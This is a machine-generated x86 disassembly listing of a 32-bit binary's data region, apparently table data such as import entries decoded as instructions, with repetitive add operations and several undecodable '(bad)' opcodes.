  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
